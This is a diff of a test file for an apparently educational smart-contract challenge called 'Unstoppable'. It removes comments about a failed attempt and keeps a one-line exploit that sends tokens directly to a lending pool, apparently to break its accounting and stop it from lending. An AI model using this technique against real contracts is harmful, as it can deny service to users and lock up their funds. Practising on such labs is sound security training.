@@ -43,10 +43,6 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
-        /* My 1st attempt: Only looked through documentation and the contracts given (2 errors: "before all" hook for "Exploit" & 
-        "after all" hook for "Exploit")
-        await expect(() => pool.transfer({to: attacker.address, value: 1000}).to.changeEtherBalance(pool, -1000));*/
-        // 2nd attempt: With additional assistance
         await this.token.transfer(this.pool.address, 10, {from: attacker});
     });
 
